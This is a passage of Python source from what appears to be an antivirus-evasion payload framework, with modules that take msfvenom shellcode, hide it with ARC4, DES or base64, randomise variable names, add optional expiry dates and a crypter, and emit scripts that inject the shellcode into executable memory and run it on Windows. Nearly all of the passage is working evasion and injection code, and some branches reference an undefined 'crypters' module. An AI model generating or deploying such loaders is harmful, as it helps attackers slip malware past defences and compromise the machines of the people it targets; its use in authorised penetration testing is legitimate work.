                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                ShellcodeVariableName = helpers.randomString()
                RandIV = helpers.randomString()
                RandARCKey = helpers.randomString()
                RandARCPayload = helpers.randomString()
                RandEncShellCodePayload = helpers.randomString()
                RandShellcode = helpers.randomString()
                RandReverseShell = helpers.randomString()
                RandMemoryShell = helpers.randomString()
                
                # encrypt the shellcode and get our randomized key/iv
                (EncShellCode, (ARCKey, iv) ) = encryption.encryptARC(Shellcode)
        
                PayloadCode = 'from Crypto.Cipher import ARC4\n'
                PayloadCode += 'from ctypes import *\n'
                PayloadCode += RandIV + ' = \'' + iv + '\'\n'
                PayloadCode += RandARCKey + ' = \'' + ARCKey + '\'\n'
                PayloadCode += RandARCPayload + ' = ARC4.new(' + RandARCKey + ')\n'
                PayloadCode += RandEncShellCodePayload + ' = \'' + EncShellCode.encode("string_escape") + '\'\n'
                PayloadCode += ShellcodeVariableName + ' = ' + RandARCPayload + '.decrypt(' + RandEncShellCodePayload + ').decode(\'string_escape\')\n'
                PayloadCode += RandMemoryShell + ' = create_string_buffer(' + ShellcodeVariableName + ', len(' + ShellcodeVariableName + '))\n'
                PayloadCode += RandShellcode + ' = cast(' + RandMemoryShell + ', CFUNCTYPE(c_void_p))\n'
                PayloadCode += RandShellcode + '()'

                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode
            
            else:

                # Get our current date and add number of days to the date
                todaysdate = date.today()
                expiredate = str(todaysdate + timedelta(days=int(self.required_options["expire_payload"][0])))

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()
        
                # Generate Random Variable Names
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                ShellcodeVariableName = helpers.randomString()
                RandIV = helpers.randomString()
                RandARCKey = helpers.randomString()
                RandARCPayload = helpers.randomString()
                RandEncShellCodePayload = helpers.randomString()
                RandShellcode = helpers.randomString()
                RandReverseShell = helpers.randomString()
                RandMemoryShell = helpers.randomString()
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()
                
                # encrypt the shellcode and get our randomized key/iv
                (EncShellCode, (ARCKey, iv) ) = encryption.encryptARC(Shellcode)
        
                PayloadCode = 'from Crypto.Cipher import ARC4\n'
                PayloadCode += 'from ctypes import *\n'
                PayloadCode += 'from datetime import datetime\n'
                PayloadCode += 'from datetime import date\n\n'
                PayloadCode += RandToday + ' = datetime.now()\n'
                PayloadCode += RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
                PayloadCode += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                PayloadCode += '\t' + RandIV + ' = \'' + iv + '\'\n'
                PayloadCode += '\t' + RandARCKey + ' = \'' + ARCKey + '\'\n'
                PayloadCode += '\t' + RandARCPayload + ' = ARC4.new(' + RandARCKey + ')\n'
                PayloadCode += '\t' + RandEncShellCodePayload + ' = \'' + EncShellCode.encode("string_escape") + '\'\n'
                PayloadCode += '\t' + ShellcodeVariableName + ' = ' + RandARCPayload + '.decrypt(' + RandEncShellCodePayload + ').decode(\'string_escape\')\n'
                PayloadCode += '\t' + RandMemoryShell + ' = create_string_buffer(' + ShellcodeVariableName + ', len(' + ShellcodeVariableName + '))\n'
                PayloadCode += '\t' + RandShellcode + ' = cast(' + RandMemoryShell + ', CFUNCTYPE(c_void_p))\n'
                PayloadCode += '\t' + RandShellcode + '()'

                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode


########NEW FILE########
__FILENAME__ = base64_substitution
"""

This payload receives the msfvenom shellcode, base64 encodes it, and stores it within the payload.
At runtime, the executable decodes the shellcode and executes it in memory.


module by @christruncer

"""

import base64

from datetime import date
from datetime import timedelta

from modules.common import shellcode
from modules.common import helpers
from modules.common import encryption


class Payload:
    
    def __init__(self):
        # required options
        self.description = "Base64 encoded shellcode is decoded at runtime and executed in memory"
        self.language = "python"
        self.extension = "py"
        self.rating = "Excellent"

        self.shellcode = shellcode.Shellcode()

        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
                                 "use_pyherion" : ["N", "Use the pyherion encrypter"],
                                 "inject_method" : ["Virtual", "Virtual, Void, Heap"],
                                 "expire_payload" : ["X", "Optional: Payloads expire after \"X\" days"]}

    def generate(self):
        if self.required_options["inject_method"][0].lower() == "virtual":
            if self.required_options["expire_payload"][0].lower() == "x":

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()
        
                # Base64 Encode Shellcode
                EncodedShellcode = base64.b64encode(Shellcode)    

                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                RandT = helpers.randomString()
                    
                PayloadCode = 'import ctypes\n'
                PayloadCode +=  'import base64\n'
                PayloadCode += RandT + " = \"" + EncodedShellcode + "\"\n"
                PayloadCode += ShellcodeVariableName + " = bytearray(" + RandT + ".decode('base64','strict').decode(\"string_escape\"))\n"
                PayloadCode += RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(' + ShellcodeVariableName + ')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
                PayloadCode += RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName  + ')).from_buffer(' + ShellcodeVariableName + ')\n'
                PayloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
                PayloadCode += RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
                PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'

                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode

            else:
                # Get our current date and add number of days to the date
                todaysdate = date.today()
                expiredate = str(todaysdate + timedelta(days=int(self.required_options["expire_payload"][0])))

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()
        
                # Base64 Encode Shellcode
                EncodedShellcode = base64.b64encode(Shellcode)    

                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                RandT = helpers.randomString()
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()

                PayloadCode = 'import ctypes\n'
                PayloadCode += 'import base64\n'
                PayloadCode += 'from datetime import datetime\n'
                PayloadCode += 'from datetime import date\n\n'
                PayloadCode += RandToday + ' = datetime.now()\n'
                PayloadCode += RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
                PayloadCode += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                PayloadCode += '\t' + RandT + " = \"" + EncodedShellcode + "\"\n"
                PayloadCode += '\t' + ShellcodeVariableName + " = bytearray(" + RandT + ".decode('base64','strict').decode(\"string_escape\"))\n"
                PayloadCode += '\t' + RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(' + ShellcodeVariableName + ')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
                PayloadCode += '\t' + RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName  + ')).from_buffer(' + ShellcodeVariableName + ')\n'
                PayloadCode += '\t' + 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
                PayloadCode += '\t' + RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
                PayloadCode += '\t' + 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'

                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode
        if self.required_options["inject_method"][0].lower() == "heap":
            if self.required_options["expire_payload"][0].lower() == "x":

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()

                # Base64 Encode Shellcode
                EncodedShellcode = base64.b64encode(Shellcode)

                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                RandT = helpers.randomString()
                HeapVar = helpers.randomString()

                PayloadCode = 'import ctypes\n'
                PayloadCode += 'import base64\n'
                PayloadCode += RandT + " = \"" + EncodedShellcode + "\"\n"
                PayloadCode += ShellcodeVariableName + " = bytearray(" + RandT + ".decode('base64','strict').decode(\"string_escape\"))\n"
                PayloadCode += HeapVar + ' = ctypes.windll.kernel32.HeapCreate(ctypes.c_int(0x00040000),ctypes.c_int(len(' + ShellcodeVariableName + ') * 2),ctypes.c_int(0))\n'
                PayloadCode += RandPtr + ' = ctypes.windll.kernel32.HeapAlloc(ctypes.c_int(' + HeapVar + '),ctypes.c_int(0x00000008),ctypes.c_int(len( ' + ShellcodeVariableName + ')))\n'
                PayloadCode += RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName  + ')).from_buffer(' + ShellcodeVariableName + ')\n'
                PayloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
                PayloadCode += RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
                PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'

                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = crypters.pyherion(PayloadCode)

                return PayloadCode

            else:

                # Get our current date and add number of days to the date
                todaysdate = date.today()
                expiredate = str(todaysdate + timedelta(days=int(self.required_options["expire_payload"][0])))

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()

                # Base64 Encode Shellcode
                EncodedShellcode = base64.b64encode(Shellcode)

                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                RandT = helpers.randomString()
                HeapVar = helpers.randomString()
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()

                PayloadCode = 'import ctypes\n'
                PayloadCode +=  'import base64\n'
                PayloadCode += 'from datetime import datetime\n'
                PayloadCode += 'from datetime import date\n\n'
                PayloadCode += RandToday + ' = datetime.now()\n'
                PayloadCode += RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
                PayloadCode += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                PayloadCode += '\t' + RandT + " = \"" + EncodedShellcode + "\"\n"
                PayloadCode += '\t' + ShellcodeVariableName + " = bytearray(" + RandT + ".decode('base64','strict').decode(\"string_escape\"))\n"
                PayloadCode += '\t' + HeapVar + ' = ctypes.windll.kernel32.HeapCreate(ctypes.c_int(0x00040000),ctypes.c_int(len(' + ShellcodeVariableName + ') * 2),ctypes.c_int(0))\n'
                PayloadCode += '\t' + RandPtr + ' = ctypes.windll.kernel32.HeapAlloc(ctypes.c_int(' + HeapVar + '),ctypes.c_int(0x00000008),ctypes.c_int(len( ' + ShellcodeVariableName + ')))\n'
                PayloadCode += '\t' + RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName  + ')).from_buffer(' + ShellcodeVariableName + ')\n'
                PayloadCode += '\tctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
                PayloadCode += '\t' + RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
                PayloadCode += '\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'

                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = crypters.pyherion(PayloadCode)

                return PayloadCode

        else:
            if self.required_options["expire_payload"][0].lower() == "x":

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()

                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandShellcode = helpers.randomString()
                RandReverseShell = helpers.randomString()
                RandMemoryShell = helpers.randomString()
                DecodedShellcode = helpers.randomString()

                # Base64 Encode Shellcode
                EncodedShellcode = base64.b64encode(Shellcode)

                PayloadCode = 'from ctypes import *\n'
                PayloadCode += 'import base64\n'
                PayloadCode += ShellcodeVariableName + " = \"" + EncodedShellcode + "\"\n"
                PayloadCode += DecodedShellcode + " = bytearray(" + ShellcodeVariableName + ".decode('base64','strict').decode(\"string_escape\"))\n"
                PayloadCode += RandMemoryShell + ' = create_string_buffer(str(' + DecodedShellcode + '), len(str(' + DecodedShellcode + ')))\n'
                PayloadCode += RandShellcode + ' = cast(' + RandMemoryShell + ', CFUNCTYPE(c_void_p))\n'
                PayloadCode += RandShellcode + '()'
    
                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode

            else:

                # Get our current date and add number of days to the date
                todaysdate = date.today()
                expiredate = str(todaysdate + timedelta(days=int(self.required_options["expire_payload"][0])))

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()

                # Generate Random Variable Names
                ShellcodeVariableName = helpers.randomString()
                RandShellcode = helpers.randomString()
                RandReverseShell = helpers.randomString()
                RandMemoryShell = helpers.randomString()
                DecodedShellcode = helpers.randomString()
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()

                # Base64 Encode Shellcode
                EncodedShellcode = base64.b64encode(Shellcode)

                PayloadCode = 'from ctypes import *\n'
                PayloadCode += 'import base64\n'
                PayloadCode += 'from datetime import datetime\n'
                PayloadCode += 'from datetime import date\n\n'
                PayloadCode += RandToday + ' = datetime.now()\n'
                PayloadCode += RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
                PayloadCode += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                PayloadCode += '\t' + ShellcodeVariableName + " = \"" + EncodedShellcode + "\"\n"
                PayloadCode += '\t' + DecodedShellcode + " = bytearray(" + ShellcodeVariableName + ".decode('base64','strict').decode(\"string_escape\"))\n"
                PayloadCode += '\t' + RandMemoryShell + ' = create_string_buffer(str(' + DecodedShellcode + '), len(str(' + DecodedShellcode + ')))\n'
                PayloadCode += '\t' + RandShellcode + ' = cast(' + RandMemoryShell + ', CFUNCTYPE(c_void_p))\n'
                PayloadCode += '\t' + RandShellcode + '()'

                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)

                return PayloadCode


########NEW FILE########
__FILENAME__ = des_encrypt
"""

This payload has DES encrypted shellcode stored within itself.  At runtime, the executable
uses the key within the file to decrypt the shellcode, injects it into memory, and executes it.

Great examples and code adapted from 
http://www.laurentluce.com/posts/python-and-cryptography-with-pycrypto/


module by @christruncer

"""


from datetime import date
from datetime import timedelta

from modules.common import shellcode
from modules.common import helpers
from modules.common import encryption


class Payload:
    
    def __init__(self):
        # required options
        self.description = "DES Encrypted shellcode is decrypted at runtime with key in file, injected into memory, and executed"
        self.language = "python"
        self.extension = "py"
        self.rating = "Excellent"
        
        self.shellcode = shellcode.Shellcode()

        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
                                 "use_pyherion" : ["N", "Use the pyherion encrypter"],
                                 "inject_method" : ["Virtual", "Virtual, Void, Heap"],
                                 "expire_payload" : ["X", "Optional: Payloads expire after \"X\" days"]}
    
    def generate(self):
        if self.required_options["inject_method"][0].lower() == "virtual":
            if self.required_options["expire_payload"][0].lower() == "x":
        
                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()
        
                # Generate Random Variable Names
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                ShellcodeVariableName = helpers.randomString()
                RandIV = helpers.randomString()
                RandDESKey = helpers.randomString()
                RandDESPayload = helpers.randomString()
                RandEncShellCodePayload = helpers.randomString()
        
                # encrypt the shellcode and get our randomized key/iv
                (EncShellCode, (DESKey, iv) ) = encryption.encryptDES(Shellcode)

                # Create Payload File
                PayloadCode = 'from Crypto.Cipher import DES\n'
                PayloadCode += 'import ctypes\n'
                PayloadCode += RandIV + ' = \'' + iv + '\'\n'
                PayloadCode += RandDESKey + ' = \'' + DESKey + '\'\n'
                PayloadCode += RandDESPayload + ' = DES.new(' + RandDESKey + ', DES.MODE_CFB, ' + RandIV + ')\n'
                PayloadCode += RandEncShellCodePayload + ' = \'' + EncShellCode.encode("string_escape") + '\'\n'
                PayloadCode += ShellcodeVariableName + ' = bytearray(' + RandDESPayload + '.decrypt(' + RandEncShellCodePayload + ').decode(\'string_escape\'))\n'
                PayloadCode += RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len('+ ShellcodeVariableName +')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
                PayloadCode += RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n'
                PayloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
                PayloadCode += RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
                PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))'
        
                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)
        
                return PayloadCode

            else:

                # Get our current date and add number of days to the date
                todaysdate = date.today()
                expiredate = str(todaysdate + timedelta(days=int(self.required_options["expire_payload"][0])))

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()
        
                # Generate Random Variable Names
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                ShellcodeVariableName = helpers.randomString()
                RandIV = helpers.randomString()
                RandDESKey = helpers.randomString()
                RandDESPayload = helpers.randomString()
                RandEncShellCodePayload = helpers.randomString()
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()
        
                # encrypt the shellcode and get our randomized key/iv
                (EncShellCode, (DESKey, iv) ) = encryption.encryptDES(Shellcode)

                # Create Payload File
                PayloadCode = 'from Crypto.Cipher import DES\n'
                PayloadCode += 'import ctypes\n'
                PayloadCode += 'from datetime import datetime\n'
                PayloadCode += 'from datetime import date\n\n'
                PayloadCode += RandToday + ' = datetime.now()\n'
                PayloadCode += RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
                PayloadCode += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                PayloadCode += '\t' + RandIV + ' = \'' + iv + '\'\n'
                PayloadCode += '\t' + RandDESKey + ' = \'' + DESKey + '\'\n'
                PayloadCode += '\t' + RandDESPayload + ' = DES.new(' + RandDESKey + ', DES.MODE_CFB, ' + RandIV + ')\n'
                PayloadCode += '\t' + RandEncShellCodePayload + ' = \'' + EncShellCode.encode("string_escape") + '\'\n'
                PayloadCode += '\t' + ShellcodeVariableName + ' = bytearray(' + RandDESPayload + '.decrypt(' + RandEncShellCodePayload + ').decode(\'string_escape\'))\n'
                PayloadCode += '\t' + RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len('+ ShellcodeVariableName +')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
                PayloadCode += '\t' + RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n'
                PayloadCode += '\tctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
                PayloadCode += '\t' + RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
                PayloadCode += '\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))'
        
                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)
        
                return PayloadCode

        if self.required_options["inject_method"][0].lower() == "heap":
            if self.required_options["expire_payload"][0].lower() == "x":

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()
        
                # Generate Random Variable Names
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                ShellcodeVariableName = helpers.randomString()
                RandIV = helpers.randomString()
                RandDESKey = helpers.randomString()
                RandDESPayload = helpers.randomString()
                RandEncShellCodePayload = helpers.randomString()
                HeapVar = helpers.randomString()
        
                # encrypt the shellcode and get our randomized key/iv
                (EncShellCode, (DESKey, iv) ) = encryption.encryptDES(Shellcode)

                # Create Payload File
                PayloadCode = 'from Crypto.Cipher import DES\n'
                PayloadCode += 'import ctypes\n'
                PayloadCode += RandIV + ' = \'' + iv + '\'\n'
                PayloadCode += RandDESKey + ' = \'' + DESKey + '\'\n'
                PayloadCode += RandDESPayload + ' = DES.new(' + RandDESKey + ', DES.MODE_CFB, ' + RandIV + ')\n'
                PayloadCode += RandEncShellCodePayload + ' = \'' + EncShellCode.encode("string_escape") + '\'\n'
                PayloadCode += ShellcodeVariableName + ' = bytearray(' + RandDESPayload + '.decrypt(' + RandEncShellCodePayload + ').decode(\'string_escape\'))\n'
                PayloadCode += HeapVar + ' = ctypes.windll.kernel32.HeapCreate(ctypes.c_int(0x00040000),ctypes.c_int(len(' + ShellcodeVariableName + ') * 2),ctypes.c_int(0))\n'
                PayloadCode += RandPtr + ' = ctypes.windll.kernel32.HeapAlloc(ctypes.c_int(' + HeapVar + '),ctypes.c_int(0x00000008),ctypes.c_int(len( ' + ShellcodeVariableName + ')))\n'
                PayloadCode += RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n'
                PayloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
                PayloadCode += RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
                PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))'
        
                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = crypters.pyherion(PayloadCode)
        
                return PayloadCode

            else:

                # Get our current date and add number of days to the date
                todaysdate = date.today()
                expiredate = str(todaysdate + timedelta(days=int(self.required_options["expire_payload"][0])))

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()
        
                # Generate Random Variable Names
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                ShellcodeVariableName = helpers.randomString()
                RandIV = helpers.randomString()
                RandDESKey = helpers.randomString()
                RandDESPayload = helpers.randomString()
                RandEncShellCodePayload = helpers.randomString()
                HeapVar = helpers.randomString()
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()
        
                # encrypt the shellcode and get our randomized key/iv
                (EncShellCode, (DESKey, iv) ) = encryption.encryptDES(Shellcode)

                # Create Payload File
                PayloadCode = 'from Crypto.Cipher import DES\n'
                PayloadCode += 'import ctypes\n'
                PayloadCode += 'from datetime import datetime\n'
                PayloadCode += 'from datetime import date\n\n'
                PayloadCode += RandToday + ' = datetime.now()\n'
                PayloadCode += RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
                PayloadCode += 'if ' + RandToday + ' < ' + RandExpire + ':\n'
                PayloadCode += '\t' + RandIV + ' = \'' + iv + '\'\n'
                PayloadCode += '\t' + RandDESKey + ' = \'' + DESKey + '\'\n'
                PayloadCode += '\t' + RandDESPayload + ' = DES.new(' + RandDESKey + ', DES.MODE_CFB, ' + RandIV + ')\n'
                PayloadCode += '\t' + RandEncShellCodePayload + ' = \'' + EncShellCode.encode("string_escape") + '\'\n'
                PayloadCode += '\t' + ShellcodeVariableName + ' = bytearray(' + RandDESPayload + '.decrypt(' + RandEncShellCodePayload + ').decode(\'string_escape\'))\n'
                PayloadCode += '\t' + HeapVar + ' = ctypes.windll.kernel32.HeapCreate(ctypes.c_int(0x00040000),ctypes.c_int(len(' + ShellcodeVariableName + ') * 2),ctypes.c_int(0))\n'
                PayloadCode += '\t' + RandPtr + ' = ctypes.windll.kernel32.HeapAlloc(ctypes.c_int(' + HeapVar + '),ctypes.c_int(0x00000008),ctypes.c_int(len( ' + ShellcodeVariableName + ')))\n'
                PayloadCode += '\t' + RandBuf + ' = (ctypes.c_char * len(' + ShellcodeVariableName + ')).from_buffer(' + ShellcodeVariableName + ')\n'
                PayloadCode += '\tctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + ShellcodeVariableName + ')))\n'
                PayloadCode += '\t' + RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
                PayloadCode += '\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))'
        
                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = crypters.pyherion(PayloadCode)
        
                return PayloadCode

        else:
            if self.required_options["expire_payload"][0].lower() == "x":

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()
        
                # Generate Random Variable Names
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                ShellcodeVariableName = helpers.randomString()
                RandIV = helpers.randomString()
                RandDESKey = helpers.randomString()
                RandDESPayload = helpers.randomString()
                RandEncShellCodePayload = helpers.randomString()
                RandShellcode = helpers.randomString()
                RandReverseShell = helpers.randomString()
                RandMemoryShell = helpers.randomString()
        
                # encrypt the shellcode and get our randomized key/iv
                (EncShellCode, (DESKey, iv) ) = encryption.encryptDES(Shellcode)
                
                # Create Payload File
                PayloadCode = 'from Crypto.Cipher import DES\n'
                PayloadCode += 'from ctypes import *\n'
                PayloadCode += RandIV + ' = \'' + iv + '\'\n'
                PayloadCode += RandDESKey + ' = \'' + DESKey + '\'\n'
                PayloadCode += RandDESPayload + ' = DES.new(' + RandDESKey + ', DES.MODE_CFB, ' + RandIV + ')\n'
                PayloadCode += RandEncShellCodePayload + ' = \'' + EncShellCode.encode("string_escape") + '\'\n'
                PayloadCode += ShellcodeVariableName + ' = ' + RandDESPayload + '.decrypt(' + RandEncShellCodePayload + ').decode(\'string_escape\')\n'
                PayloadCode += RandMemoryShell + ' = create_string_buffer(' + ShellcodeVariableName + ', len(' + ShellcodeVariableName + '))\n'
                PayloadCode += RandShellcode + ' = cast(' + RandMemoryShell + ', CFUNCTYPE(c_void_p))\n'
                PayloadCode += RandShellcode + '()'

                if self.required_options["use_pyherion"][0].lower() == "y":
                    PayloadCode = encryption.pyherion(PayloadCode)
        
                return PayloadCode

            else:

                # Get our current date and add number of days to the date
                todaysdate = date.today()
                expiredate = str(todaysdate + timedelta(days=int(self.required_options["expire_payload"][0])))

                # Generate Shellcode Using msfvenom
                Shellcode = self.shellcode.generate()
        
                # Generate Random Variable Names
                RandPtr = helpers.randomString()
                RandBuf = helpers.randomString()
                RandHt = helpers.randomString()
                ShellcodeVariableName = helpers.randomString()
                RandIV = helpers.randomString()
                RandDESKey = helpers.randomString()
                RandDESPayload = helpers.randomString()
                RandEncShellCodePayload = helpers.randomString()
                RandShellcode = helpers.randomString()
                RandReverseShell = helpers.randomString()
                RandMemoryShell = helpers.randomString()
                RandToday = helpers.randomString()
                RandExpire = helpers.randomString()
        
                # encrypt the shellcode and get our randomized key/iv
                (EncShellCode, (DESKey, iv) ) = encryption.encryptDES(Shellcode)

                # Create Payload File
                PayloadCode = 'from Crypto.Cipher import DES\n'
                PayloadCode += 'from ctypes import *\n'
                PayloadCode += 'from datetime import datetime\n'
                PayloadCode += 'from datetime import date\n\n'
                PayloadCode += RandToday + ' = datetime.now()\n'
